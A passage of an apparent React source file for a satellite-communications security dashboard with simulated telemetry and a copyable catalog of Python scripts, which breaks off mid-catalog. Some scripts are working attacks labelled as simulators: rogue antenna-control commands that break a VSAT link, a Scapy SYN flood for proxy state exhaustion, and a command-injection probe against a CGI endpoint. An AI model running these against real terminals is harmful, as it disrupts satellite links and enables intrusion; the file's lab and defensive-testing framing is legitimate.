import { useState, useEffect, useRef } from 'react';
import { 
  Terminal, Shield, Radio, Code2, Cpu, Copy, Check, Download, Play, Square, 
  RefreshCw, RadioTower, Compass, Clock, Zap, AlertTriangle, HelpCircle, HardDrive
} from 'lucide-react';

// Custom Types for our Applet State
export type ActiveTab = 'INFRASTRUCTURE' | 'CRYPTO_ENGINE' | 'ACTIVE_DEFENSE' | 'SATCOM_HUB' | 'CODE_VAULT' | 'COGNITIVE_SHIELD' | 'COGNITIVE_SCRIPT_GEN';

export interface CodeSnippet {
  id: string;
  title: string;
  category: string;
  description: string;
  code: string;
  language: string;
}

export interface SystemTelemetryData {
  uptime: string;
  snr: number;
  ber: number;
  jammingProbability: 'LOW' | 'MEDIUM' | 'HIGH';
  gpsDrift: number;
  acuAzimuth: number;
  acuElevation: number;
  isAcuAligned: boolean;
  pepStateConnections: number;
  pepStatus: 'NOMINAL' | 'EXHAUSTED' | 'BYPASSED';
  plutoCenterFreq: number;
  plutoGain: number;
  logs: string[];
}

// Helpers for color-coded severity levels in log feed
const getLogDetails = (log: string) => {
  const timestampRegex = /^\[(\d{2}:\d{2}:\d{2})\]\s*/;
  const timestampMatch = log.match(timestampRegex);
  
  let timestamp = "";
  let remaining = log;
  
  if (timestampMatch) {
    timestamp = timestampMatch[1];
    remaining = log.slice(timestampMatch[0].length).trim();
  }
  
  const tagRegex = /^\[([A-Z_]+)\]\s*/;
  const tagMatch = remaining.match(tagRegex);
  
  let tag = "INFO";
  let message = remaining;
  
  if (tagMatch) {
    tag = tagMatch[1];
    message = remaining.slice(tagMatch[0].length).trim();
  } else {
    const normalized = remaining.toLowerCase();
    if (normalized.startsWith("generating") || normalized.startsWith("copied")) {
      tag = "STATUS";
    }
  }
  
  return { timestamp, tag, message };
};

const getTagConfig = (tag: string) => {
  const normalized = tag.toUpperCase();
  switch (normalized) {
    case 'CRITICAL':
      return {
        bg: 'bg-red-950/40 border-red-800/60',
        text: 'text-red-400 font-bold',
        msgText: 'text-red-300 font-semibold',
        label: 'CRITICAL'
      };
    case 'EMERGENCY':
      return {
        bg: 'bg-red-900/30 border-red-600/50 animate-pulse',
        text: 'text-red-500 font-black',
        msgText: 'text-red-200 font-bold',
        label: 'EMERGENCY'
      };
    case 'ALERT':
      return {
        bg: 'bg-rose-950/40 border-rose-800/60',
        text: 'text-rose-400 font-bold',
        msgText: 'text-rose-300',
        label: 'ALERT'
      };
    case 'WARNING':
    case 'WARN':
      return {
        bg: 'bg-amber-950/40 border-amber-800/60',
        text: 'text-amber-400 font-semibold',
        msgText: 'text-amber-200/90',
        label: 'WARNING'
      };
    case 'STATUS':
      return {
        bg: 'bg-emerald-950/30 border-emerald-800/40',
        text: 'text-emerald-400',
        msgText: 'text-emerald-100/90',
        label: 'STATUS'
      };
    case 'INIT':
      return {
        bg: 'bg-cyan-950/30 border-cyan-800/40',
        text: 'text-cyan-400',
        msgText: 'text-cyan-100/90',
        label: 'INIT'
      };
    case 'SYSTEM':
      return {
        bg: 'bg-purple-950/30 border-purple-800/40',
        text: 'text-purple-400',
        msgText: 'text-purple-200/90',
        label: 'SYSTEM'
      };
    case 'AI':
    case 'COGNITIVE':
    case 'SHIELD':
      return {
        bg: 'bg-cyan-900/40 border-[#06B6D4]/50 animate-pulse',
        text: 'text-[#06B6D4] font-bold',
        msgText: 'text-cyan-200 font-medium',
        label: 'COGNITIVE'
      };
    case 'MONITOR':
      return {
        bg: 'bg-blue-950/30 border-blue-800/40',
        text: 'text-blue-400',
        msgText: 'text-blue-200/90',
        label: 'MONITOR'
      };
    case 'INFO':
    default:
      return {
        bg: 'bg-zinc-900 border-zinc-800',
        text: 'text-zinc-400',
        msgText: 'text-zinc-300',
        label: normalized
      };
  }
};

export default function App() {
  const [activeTab, setActiveTab] = useState<ActiveTab>('INFRASTRUCTURE');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [uptime, setUptime] = useState('142:12:09');

  // --- Real-time Simulated Stats ---
  const [snr, setSnr] = useState<number>(12.82);
  const [ber, setBer] = useState<number>(1.24e-8);
  const [jammingProbability, setJammingProbability] = useState<'LOW' | 'MEDIUM' | 'HIGH'>('LOW');
  const [gpsDrift, setGpsDrift] = useState<number>(0.002); // ms
  const [acuAzimuth, setAcuAzimuth] = useState<number>(142.5); // degrees
  const [acuElevation, setAcuElevation] = useState<number>(42.8); // degrees
  const [isAcuAligned, setIsAcuAligned] = useState<boolean>(true);
  const [pepStateConnections, setPepStateConnections] = useState<number>(24);
  const [pepStatus, setPepStatus] = useState<'NOMINAL' | 'EXHAUSTED' | 'BYPASSED'>('NOMINAL');

  // --- Live Interactive Simulators State ---
  // 1. DSSS Custom Text Spreader
  const [dsssInput, setDsssInput] = useState<string>('SAT');
  const [chipRate, setChipRate] = useState<number>(11);
  const [spreadResult, setSpreadResult] = useState<{
    binary: string;
    spreadChips: number[];
    isSpread: boolean;
  }>({ binary: '', spreadChips: [], isSpread: false });

  // 2. ADALM-Pluto Live RF Spectrum Simulator
  const [plutoCenterFreq, setPlutoCenterFreq] = useState<number>(2.45); // GHz
  const [plutoBandwidth, setPlutoBandwidth] = useState<number>(1.0); // MHz
  const [plutoGain, setPlutoGain] = useState<number>(20); // dB
  const [isPlutoScanning, setIsPlutoScanning] = useState<boolean>(true);
  const [spectrumData, setSpectrumData] = useState<number[]>([]);
  const [theme, setTheme] = useState<'GHOST_WATCH' | 'DAYTIME_FIELD'>('GHOST_WATCH');
  const [waterfallHistory, setWaterfallHistory] = useState<number[][]>([]);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // 3. Simulated Terminal Logs
  const [logs, setLogs] = useState<string[]>([
    '[INIT] Ghost-Watch C2 Terminal initialized.',
    '[SYSTEM] NIST Post-Quantum Algorithms (Kyber/Dilithium) loaded.',
    '[STATUS] Hardened physical key binding active on tethered YubiKey.',
    '[MONITOR] Satellite downlink carrier active. Center frequency: 12.45 GHz.'
  ]);
  const [isSimulatingAttack, setIsSimulatingAttack] = useState<string | null>(null);

  // --- Helper to add logs ---
  const addLog = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [`[${timestamp}] ${message}`, ...prev.slice(0, 49)]);
  };

  // --- Copy to Clipboard Handler ---
  const handleCopyCode = (id: string, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedId(id);
    addLog(`Copied script source code [${id}] to clipboard.`);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // --- Generate dynamic spectrum data ---
  useEffect(() => {
    if (!isPlutoScanning) return;

    const interval = setInterval(() => {
      const size = 50;
      const data: number[] = [];
      const isJamming = jammingProbability !== 'LOW';

      for (let i = 0; i < size; i++) {
        // Base noise floor
        let val = -95 + Math.random() * 8;

        // Carrier frequency peak in the middle
        const centerIndex = size / 2;
        const distFromCenter = Math.abs(i - centerIndex);
        
        if (distFromCenter < 5) {
          // Add standard signal peak
          val += (10 - distFromCenter * 1.5) * (plutoGain / 15);
        }

        // Jamming spike
        if (isJamming && i > 30 && i < 35) {
          val += 45 + Math.random() * 15;
        }

        // DSSS spreading signal (slight broad hum across everything)
        if (spreadResult.isSpread) {
          val += 3 + Math.random() * 2;
        }

        data.push(val);
      }
      setSpectrumData(data);
      setWaterfallHistory(prev => {
        const next = [data, ...prev];
        return next.slice(0, 32); // Keep last 32 sweeps for waterfall display
      });
    }, 150);

    return () => clearInterval(interval);
  }, [isPlutoScanning, plutoGain, jammingProbability, spreadResult.isSpread]);

  // --- Paint Spectrum Waterfall Spectrogram ---
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const width = canvas.width;
    const height = canvas.height;
    ctx.clearRect(0, 0, width, height);

    if (waterfallHistory.length === 0) return;

    const rows = waterfallHistory.length;
    const cols = waterfallHistory[0]?.length || 50;
    const cellWidth = width / cols;
    const cellHeight = height / rows;

    const isDay = theme === 'DAYTIME_FIELD';

    for (let r = 0; r < rows; r++) {
      const data = waterfallHistory[r];
      if (!data) continue;
      for (let c = 0; c < cols; c++) {
        const val = data[c] !== undefined ? data[c] : -95;
        // Map val (-95 to -30 dBFS) to color intensity [0, 1]
        const intensity = Math.max(0, Math.min(1, (val + 95) / 65));
        
        let color = '';
        if (isDay) {
          // Daylight high contrast scale:
          // low signal (intensity near 0) -> white/light-gray (rgb(244,244,245))
          // medium signal -> orange / deep orange (rgb(194,65,12))
          // peak signal (intensity near 1) -> dark violet/navy (rgb(30,27,75))
          if (intensity < 0.15) {
            color = 'rgb(244, 244, 245)';
          } else if (intensity < 0.6) {
            const ratio = (intensity - 0.15) / 0.45;
            const rColor = Math.floor(244 - ratio * (244 - 194));
            const gColor = Math.floor(244 - ratio * (244 - 65));
            const bColor = Math.floor(245 - ratio * (245 - 12));
            color = `rgb(${rColor}, ${gColor}, ${bColor})`;
          } else {
            const ratio = (intensity - 0.6) / 0.4;
            const rColor = Math.floor(194 - ratio * (194 - 30));
            const gColor = Math.floor(65 - ratio * (65 - 27));
            const bColor = Math.floor(12 + ratio * (75 - 12));
            color = `rgb(${rColor}, ${gColor}, ${bColor})`;
          }
        } else {
          // Ghost-Watch dark scale:
          // low signal (intensity near 0) -> pure black / dark background (rgb(9,9,9))
          // medium signal -> deep red / bright orange (rgb(255, 78, 0))
          // peak signal (intensity near 1) -> bright gold / white (rgb(255, 230, 100))
          if (intensity < 0.25) {
            const ratio = intensity / 0.25;
            color = `rgb(${Math.floor(ratio * 20)}, 0, ${Math.floor(ratio * 40)})`;
          } else if (intensity < 0.75) {
            const ratio = (intensity - 0.25) / 0.5;
            const rColor = Math.floor(20 + ratio * 235);
            const gColor = Math.floor(ratio * 78);
            const bColor = Math.floor(40 - ratio * 40);
            color = `rgb(${rColor}, ${gColor}, ${bColor})`;
          } else {
            const ratio = (intensity - 0.75) / 0.25;
            const rColor = 255;
            const gColor = Math.floor(78 + ratio * 152);
            const bColor = Math.floor(ratio * 100);
            color = `rgb(${rColor}, ${gColor}, ${bColor})`;
          }
        }

        ctx.fillStyle = color;
        ctx.fillRect(c * cellWidth, r * cellHeight, cellWidth, cellHeight);
      }
    }
  }, [waterfallHistory, theme]);

  // --- Clock Uptime Incrementor ---
  useEffect(() => {
    const interval = setInterval(() => {
      setUptime(prevUptime => {
        const parts = prevUptime.split(':').map(Number);
        let [h, m, s] = parts;
        s++;
        if (s >= 60) {
          s = 0;
          m++;
          if (m >= 60) {
            m = 0;
            h++;
          }
        }
        const hStr = String(h).padStart(3, '0');
        const mStr = String(m).padStart(2, '0');
        const sStr = String(s).padStart(2, '0');
        return `${hStr}:${mStr}:${sStr}`;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // --- GPS Timing Monitor Logic ---
  useEffect(() => {
    if (gpsDrift > 50) {
      addLog(`[ALERT] GPS Timing Monitor: Drift of ${gpsDrift.toFixed(3)} ms exceeds the 50.0 ms tolerance threshold! Possible TDMA sync loss.`);
    }
  }, [gpsDrift]);

  // --- Cognitive Shield State ---
  const [isShieldAnalyzing, setIsShieldAnalyzing] = useState<boolean>(false);
  const [shieldResult, setShieldResult] = useState<{
    status?: string;
    threatLevel?: string;
    diagnosis?: string;
    playbook?: string[];
    signature?: string;
  } | null>(null);

  // --- Cognitive Script Gen State ---
  const [isScriptGenerating, setIsScriptGenerating] = useState<boolean>(false);
  const [scriptGenScenario, setScriptGenScenario] = useState<string>('Detect satellite downlink carrier jamming spikes');
  const [scriptGenTarget, setScriptGenTarget] = useState<string>('ADALM-Pluto SDR (pyadi-iio)');
  const [scriptGenOutput, setScriptGenOutput] = useState<{
    scriptTitle?: string;
    scriptDescription?: string;
    language?: string;
    code?: string;
    operatorNotes?: string;
  } | null>(null);

  const triggerShieldAnalysis = async () => {
    setIsShieldAnalyzing(true);
    addLog('[COGNITIVE] Initiating real-time SATCOM threat intelligence analysis via Gemini 3.8-Flash...');
    try {
      const res = await fetch('/api/gemini/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          telemetry: {
            snr,
            ber,
            jammingProbability,
            gpsDrift,
            acuAzimuth,
            acuElevation,
            isAcuAligned,
            pepStatus,
            pepStateConnections,
            plutoCenterFreq,
            plutoGain
          },
          logs
        })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`[CRITICAL] Cognitive Shield analysis failed: ${data.error}`);
        alert(`[COGNITIVE SHIELD ERROR]\n${data.error}`);
      } else {
        setShieldResult(data);
        addLog(`[COGNITIVE] Threat analysis complete. Diagnosis: ${data.status || 'RESOLVED'} | Threat Level: ${data.threatLevel || 'UNKNOWN'}`);
      }
    } catch (err: any) {
      addLog(`[CRITICAL] Cognitive Shield connection error: ${err.message}`);
    } finally {
      setIsShieldAnalyzing(false);
    }
  };

  const triggerScriptGeneration = async () => {
    setIsScriptGenerating(true);
    addLog(`[COGNITIVE] Requesting custom defensive audit Python script for scenario: "${scriptGenScenario}"`);
    try {
      const res = await fetch('/api/gemini/generate-script', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          scenario: scriptGenScenario,
          targetSystem: scriptGenTarget
        })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`[CRITICAL] Custom Script generation failed: ${data.error}`);
        alert(`[SCRIPT GENERATION ERROR]\n${data.error}`);
      } else {
        setScriptGenOutput(data);
        addLog(`[COGNITIVE] Custom python tool "${data.scriptTitle || 'Script'}" successfully generated and calibrated!`);
      }
    } catch (err: any) {
      addLog(`[CRITICAL] Cognitive Script Gen connection error: ${err.message}`);
    } finally {
      setIsScriptGenerating(false);
    }
  };

  // --- Run DSSS spreading math ---
  const handleSpreadData = () => {
    // Generate simulated PN Sequence
    const pnSeq = [1, -1, 1, 1, -1, 1, -1, -1, 1, -1, 1]; // Length 11
    
    // Map string to binary
    const binary = dsssInput.split('').map(char => {
      return char.charCodeAt(0).toString(2).padStart(8, '0');
    }).join(' ');

    // Flat list of binary bits
    const bits = binary.replace(/\s/g, '').split('').map(Number);
    
    // Spread first few bits for visual representation
    const sampleBits = bits.slice(0, 3);
    const chips: number[] = [];
    sampleBits.forEach(bit => {
      const symbol = bit === 1 ? 1 : -1;
      pnSeq.forEach(pn => {
        chips.push(symbol * pn);
      });
    });

    setSpreadResult({
      binary,
      spreadChips: chips,
      isSpread: true
    });
    
    addLog(`DSSS Spread Spectrum initialized for word "${dsssInput}". Binary mapped: ${binary.substring(0, 15)}...`);
  };

  // --- Download file mock triggers ---
  const triggerDownload = (fileName: string, contentTitle: string) => {
    addLog(`Generating custom PDF/text report: ${fileName}`);
    alert(`[GHOST-WATCH SECURE CONTEXT]\nGenerating and downloading standard advisory plan:\n- Report: "${contentTitle}"\n- Output file: ${fileName}\n\nSuccessfully authorized by physical master keys.`);
  };

  // --- Interactive Attack Simulations ---
  const runSimulatedAttack = (attackName: string) => {
    setIsSimulatingAttack(attackName);
    addLog(`[ALERT] Launching interactive verification check: ${attackName}`);

    if (attackName === 'ACU_DEPOINT') {
      setIsAcuAligned(false);
      setAcuAzimuth(prev => prev + 4.8);
      setAcuElevation(prev => prev - 3.2);
      setSnr(3.42); // Drop SNR dramatically
      setBer(4.82e-3); // Increase error rate
      addLog('[CRITICAL] ACU offset injected! Azimuth shifted by +4.8°, Elevation by -3.2°');
      addLog('[STATUS] Antenna target misaligned. Carrier signal degraded!');
    } else if (attackName === 'PEP_EXHAUSTION') {
      setPepStatus('EXHAUSTED');
      setPepStateConnections(840); // Mass connection flood
      setJammingProbability('MEDIUM');
      addLog('[WARNING] Sending 100 raw malformed Scapy packets to target PEP proxy...');
      addLog('[STATUS] PEP state tables exhausted. Local TCP acceleration degraded to standard satellite latency (~600ms).');
    } else if (attackName === 'GPS_SPOOFING') {
      setGpsDrift(342.82); // Trigger high timing drift
      setJammingProbability('HIGH');
      setBer(2.52e-2);
      addLog('[CRITICAL] GPS satellite time spoofing detected! Local timing drifted by 342.82ms.');
      addLog('[ALERT] TDMA slot alignment lost. Modem disconnected from the satellite network.');
    }

    setTimeout(() => {
      setIsSimulatingAttack(null);
    }, 3000);
  };

  const resetSimulators = () => {
    setSnr(12.82);
    setBer(1.24e-8);
    setJammingProbability('LOW');
    setGpsDrift(0.002);
    setAcuAzimuth(142.5);
    setAcuElevation(42.8);
    setIsAcuAligned(true);
    setPepStateConnections(24);
    setPepStatus('NOMINAL');
    setSpreadResult({ binary: '', spreadChips: [], isSpread: false });
    setWaterfallHistory([]);
    addLog('[SYSTEM] All environment parameters reset to NOMINAL baseline state.');
  };

  // --- Export Telemetry Data & Logs Handler ---
  const exportData = () => {
    const exportPayload = {
      systemInfo: {
        terminalIdentity: "GHOST-WATCH C2",
        hardwareId: "HB-9982-AX-2026",
        uptime,
        pqcHardened: true,
        exportTimestamp: new Date().toISOString(),
      },
      telemetry: {
        snrDb: snr,
        bitErrorRate: ber,
        jammingProbability,
        gpsDriftMs: gpsDrift,
        acuAzimuth,
        acuElevation,
        isAcuAligned,
        pepStateConnections,
        pepStatus,
        plutoCenterFreqGhz: plutoCenterFreq,
        plutoGainDb: plutoGain,
      },
      diagnosticLogs: logs,
      scriptsCatalog: scriptsCatalog.map(s => ({
        id: s.id,
        title: s.title,
        category: s.category,
        description: s.description,
        language: s.language
      }))
    };

    const dataStr = JSON.stringify(exportPayload, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `ghost_watch_telemetry_logs_${Date.now()}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    addLog('[SYSTEM] Telemetry and diagnostic log feed exported successfully to JSON file.');
  };

  // --- Raw Python Scripts Catalog (9 complete scripts) ---
  const scriptsCatalog: CodeSnippet[] = [
    {
      id: 'code1',
      title: 'ACU Target De-pointing Simulator',
      category: 'INFRASTRUCTURE',
      description: 'Simulates sending SCADA/Telnet commands to an Antenna Control Unit (ACU) to adjust Azimuth and Elevation offsets, resulting in physical layer signal loss.',
      language: 'python',
      code: `#!/usr/bin/env python3
import socket
import time

def simulate_acu_depoint(acu_ip: str, port: int = 4000):
    """
    Simulates sending rogue SCADA/Telnet commands to an ACU 
    to shift Azimuth and Elevation, breaking the satellite link.
    """
    # Common ACU commands (varies by vendor e.g., SeaTel, Intellian, Cobham)
    # This simulation uses generic plain-text serial over Ethernet commands
    rogue_commands = [
        b'SET AZ OFFSET +2.5\\r\\n',
        b'SET EL OFFSET -1.5\\r\\n',
        b'TARGET SATELLITE 0\\r\\n', # Tell ACU to stow or target nothing
        b'TX MUTE ON\\r\\n'          # Disable the BUC (Block Upconverter)
    ]

    print(f"[*] Connecting to ACU Management Interface at {acu_ip}:{port}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((acu_ip, port))
            print("[+] Connected to ACU.")
            
            for cmd in rogue_commands:
                print(f"[*] Injecting command: {cmd.decode().strip()}")
                s.sendall(cmd)
                time.sleep(1) # Delay between commands
                
                try:
                    response = s.recv(1024).decode('utf-8').strip()
                    print(f"    [ACU Response] {response}")
                except socket.timeout:
                    print("    [!] No response from ACU.")
                    
            print("[+] De-pointing sequence complete. VSAT link should be down.")
            
    except Exception as e:
        print(f"[-] ACU Connection failed: {e}")

if __name__ == '__main__':
    # Lab Environment Target
    TARGET_ACU_IP = "192.168.10.50" 
    simulate_acu_depoint(TARGET_ACU_IP)`
    },
    {
      id: 'code2',
      title: 'GPS Timing Drift Monitor (TDMA Spoofing Detection)',
      category: 'INFRASTRUCTURE',
      description: 'Monitors NMEA data streams for sudden time jumps or coordinates, warning users of possible TDMA satellite network timing misalignment.',
      language: 'python',
      code: `#!/usr/bin/env python3
import time
import random

def parse_pseudo_nmea(sentence):
    """Simulates parsing an NMEA $GPRMC sentence for time."""
    parts = sentence.split(',')
    if len(parts) > 1 and parts[0] == '$GPRMC':
        try:
            return float(parts[1])
        except ValueError:
            return None
    return None

def monitor_gps_drift(tolerance_ms=50):
    """
    Monitors for GPS time drift. TDMA networks often fail if 
    timing drifts by more than a few milliseconds.
    """
    print(f"[*] Starting GPS Timing Monitor. Drift Tolerance: {tolerance_ms}ms")
    print("[*] Listening to NMEA stream (Simulated)...")
    
    try:
        while True:
            current_sys_time = time.time()
            # Simulate a GPS spoofing attack happening randomly
            is_under_attack = random.random() > 0.9 
            
            if is_under_attack:
                drift_injected = random.uniform(0.1, 0.5) 
                simulated_gps_time = current_sys_time + drift_injected
            else:
                simulated_gps_time = current_sys_time + random.uniform(0.001, 0.005)
                
            time_diff_ms = abs(simulated_gps_time - current_sys_time) * 1000
            
            if time_diff_ms > tolerance_ms:
                print(f"[!!!] SGNL ALARM: GPS Drift Detected! Drift: {time_diff_ms:.2f}ms")
                print(f"[!!!] TDMA Sync is at risk. Possible GPS Spoofing.")
            else:
                print(f"[OK] Clock Sync Stable. Drift: {time_diff_ms:.2f}ms")
                
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\\n[*] Monitoring terminated.")

if __name__ == '__main__':
    monitor_gps_drift()`
    },
    {
      id: 'code3',
      title: 'SATCOM PEP State Evasion Tester',
      category: 'ACTIVE_DEFENSE',
      description: 'Crafts raw TCP packets with asymmetric options and custom flags using Scapy to test state limit resilience on satellite acceleration links.',
      language: 'python',
      code: `#!/usr/bin/env python3
# Requires: pip install scapy
import sys
try:
    from scapy.all import IP, TCP, send, RandShort
except ImportError:
    print("[!] Scapy library not installed. Run: pip install scapy")
    sys.exit(1)

def test_pep_evasion(target_ip: str, target_port: int = 80):
    """
    Sends TCP packets designed to confuse satellite PEP accelerators.
    If the PEP drops or forwards these improperly, it indicates 
    a vulnerability in the satellite TCP acceleration layer.
    """
    print(f"[*] Initiating PEP Evasion Test against {target_ip}:{target_port}")
    
    # Test 1: Asymmetric Routing / Bad Checksum
    print("[*] Sending TCP SYN with invalid checksum...")
    pkt1 = IP(dst=target_ip)/TCP(dport=target_port, flags="S", chksum=0x0000)
    send(pkt1, verbose=0)
    
    # Test 2: Invalid TCP Options (rewriting window scaling)
    print("[*] Sending TCP SYN with malformed TCP Options...")
    malformed_options = [('WScale', 255), ('MSS', 0), ('SAckOK', b'')]
    pkt2 = IP(dst=target_ip)/TCP(dport=target_port, flags="S", options=malformed_options)
    send(pkt2, verbose=0)
    
    # Test 3: PEP State Table Exhaustion (Micro-Flood)
    print("[*] Sending PEP State Exhaustion burst (100 packets)...")
    for _ in range(100):
        pkt3 = IP(dst=target_ip)/TCP(sport=RandShort(), dport=target_port, flags="S")
        send(pkt3, verbose=0)
        
    print("[+] PEP Evasion simulation complete. Monitor VSAT gateway logs.")

if __name__ == '__main__':
    TARGET = "10.10.10.5" 
    test_pep_evasion(TARGET)`
    },
    {
      id: 'code4',
      title: 'ADALM-Pluto Live RF Spectrum Analyzer',
      category: 'SATCOM_HUB',
      description: 'Connects to a local or remote ADALM-Pluto SDR via pyadi-iio to capture live IQ spectrum samples and display a fast Fourier transform.',
      language: 'python',
      code: `#!/usr/bin/env python3
import adi
import numpy as np
import matplotlib.pyplot as plt
from scipy.fft import fft, fftshift

PLUTO_IP = "ip:192.168.2.1"
SAMPLE_RATE_HZ = 1e6      # 1 MHz sample rate
CENTER_FREQ_HZ = 2.4e9    # 2.4 GHz center frequency
RF_GAIN_DB = 20           
BUFFER_SIZE = 4096        

try:
    sdr = adi.Pluto(PLUTO_IP)
    print(f"[*] Connected to ADALM-Pluto SDR at {PLUTO_IP}")
except Exception as e:
    print(f"[!] Could not connect to PlutoSDR: {e}")
    exit(1)

sdr.sample_rate = int(SAMPLE_RATE_HZ)
sdr.rx_lo = int(CENTER_FREQ_HZ)
sdr.rx_gain_control_mode = "manual"
sdr.rx_hardwaregain_chan0 = int(RF_GAIN_DB)
sdr.rx_buffer_size = BUFFER_SIZE
sdr.rx_enabled_channels = [0]

plt.ion()
fig, ax = plt.subplots(figsize=(10, 6))
line, = ax.plot([], [], 'b-')
ax.set_title(f'Live RF Spectrum at {CENTER_FREQ_HZ/1e9:.2f} GHz')
ax.set_xlabel('Frequency (MHz)')
ax.set_ylabel('Magnitude (dBFS)')
ax.grid(True)

freq_bins = np.fft.fftshift(np.fft.fftfreq(BUFFER_SIZE, d=1/SAMPLE_RATE_HZ)) / 1e6

try:
    while True:
        rx_samples = sdr.rx()
        rx_samples_float = rx_samples.astype(np.float32) / (2**11)
        spectrum = fftshift(fft(rx_samples_float))
        spectrum_mag_db = 20 * np.log10(np.abs(spectrum) + 1e-9)

        line.set_xdata(freq_bins)
        line.set_ydata(spectrum_mag_db)
        ax.set_xlim(freq_bins[0], freq_bins[-1])
        ax.set_ylim(np.min(spectrum_mag_db) - 5, np.max(spectrum_mag_db) + 5)
        fig.canvas.draw()
        fig.canvas.flush_events()
        plt.pause(0.01)

except KeyboardInterrupt:
    print("\\n[*] Live capture stopped.")
finally:
    if 'sdr' in locals() and sdr.uri:
        sdr.rx_enabled_channels = []
        sdr.close()
    plt.ioff()
    plt.close(fig)`
    },
    {
      id: 'code5',
      title: 'DSSS Modulator & Covert LPI Transmitter',
      category: 'CRYPTO_ENGINE',
      description: 'Performs Direct Sequence Spread Spectrum modulation by multiplying baseband symbols with high-frequency pseudorandom spreading codes.',
      language: 'python',
      code: `#!/usr/bin/env python3
import numpy as np
import scipy.signal as signal
import matplotlib.pyplot as plt

class DSS_Modulator:
    def __init__(self, chip_rate_factor=7, carrier_freq=1000, sample_rate=10000):
        self.chip_rate_factor = chip_rate_factor
        self.carrier_freq = carrier_freq
        self.sample_rate = sample_rate
        self.T_bit = 1.0 / (self.sample_rate / (2 * chip_rate_factor))
        self.T_chip = self.T_bit / self.chip_rate_factor
        self.chips_per_sample = int(self.sample_rate * self.T_chip)
        self.pn_sequence = self._generate_pn_sequence(chip_rate_factor)

    def _generate_pn_sequence(self, length):
        np.random.seed(42) # Replicable pseudorandom seed
        return (np.random.randint(0, 2, length) * 2 - 1).tolist()

    def modulate(self, data_bits):
        modulated_signal = []
        for bit in data_bits:
            data_symbol = 1 if bit == 1 else -1
            spread_sequence = [data_symbol * chip for chip in self.pn_sequence]
            upsampled_spread = np.repeat(spread_sequence, self.chips_per_sample)
            t = np.linspace(0, len(upsampled_spread) / self.sample_rate, len(upsampled_spread), endpoint=False)
            carrier = np.cos(2 * np.pi * self.carrier_freq * t)
            bpsk_modulated = upsampled_spread * carrier
            modulated_signal.extend(bpsk_modulated)
        return np.array(modulated_signal)

    def demodulate(self, received_signal, data_length):
        demodulated_bits = []
        samples_per_bit_interval = len(received_signal) // data_length
        for i in range(data_length):
            segment = received_signal[i * samples_per_bit_interval : (i + 1) * samples_per_bit_interval]
            t_segment = np.linspace(0, len(segment) / self.sample_rate, len(segment), endpoint=False)
            carrier = np.cos(2 * np.pi * self.carrier_freq * t_segment)
            baseband_signal = segment * carrier * 2
            
            pn_upsampled = np.repeat(self.pn_sequence, self.chips_per_sample)
            if len(pn_upsampled) > len(baseband_signal):
                pn_upsampled = pn_upsampled[:len(baseband_signal)]
            elif len(pn_upsampled) < len(baseband_signal):
                pn_upsampled = np.pad(pn_upsampled, (0, len(baseband_signal) - len(pn_upsampled)), 'edge')

            correlation = np.sum(baseband_signal * pn_upsampled)
            demodulated_bits.append(1 if correlation > 0 else 0)
        return demodulated_bits`
    },
    {
      id: 'code6',
      title: 'Modem SNR Monitor & Link State Recon',
      category: 'SATCOM_HUB',
      description: 'Queries remote VSAT satellite modems via Telnet management socket commands to monitor real-time signal-to-noise ratio.',
      language: 'python',
      code: `#!/usr/bin/env python3
import socket
import time
import re

def monitor_snr(modem_ip: str, modem_port: int, query_command: bytes, buffer_size: int = 1024, timeout: int = 5):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((modem_ip, modem_port))
            sock.sendall(query_command)

            response_data = b''
            while True:
                chunk = sock.recv(buffer_size)
                if not chunk: break
                response_data += chunk
                if b'\\n' in chunk or len(response_data) > buffer_size * 2: break
            
            decoded_response = response_data.decode('utf-8', errors='ignore').strip()
            snr_match = re.search(r'(SNR|C_N_RATIO)[:=\\s]*([-+]?\\d*\\.?\\d+)', decoded_response, re.IGNORECASE)
            
            if snr_match:
                return float(snr_match.group(2))
            return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None`
    },
    {
      id: 'code7',
      title: 'CVE-2024-6199 RCE Vulnerability Scanner',
      category: 'ACTIVE_DEFENSE',
      description: 'Scans and audits administrative HTTP interfaces on older satellite terminal firmware for authentication bypass and remote command execution paths.',
      language: 'python',
      code: `#!/usr/bin/env python3
import urllib.request
import urllib.error
import sys

def scan_cve_2024_6199(target_ip: str):
    """
    Checks for vulnerability in remote admin Web UI of legacy VSAT terminals.
    This simulates an automated API test inside authorization boundaries.
    """
    path_payload = "/cgi-bin/admin_status.cgi?cmd=echo;%20whoami"
    url = f"http://{target_ip}{path_payload}"
    print(f"[*] Auditing {target_ip} for administrative authentication bypass...")
    
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=4) as response:
            body = response.read().decode('utf-8', errors='ignore')
            if "root" in body or "admin" in body:
                print(f"[!] DANGER: CVE-2024-6199 VULNERABILITY FOUND!")
                print(f"[!] Root execution response snippet: {body.strip()[:100]}")
                return True
            else:
                print("[+] Node appears secure. Auth handler returned normal context.")
                return False
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e.reason}")
        return False

if __name__ == '__main__':
    scan_cve_2024_6199("192.168.100.1")`
    },
    {
      id: 'code8',
      title: 'TR-069 ACS Configuration Monitor',
      category: 'INFRASTRUCTURE',
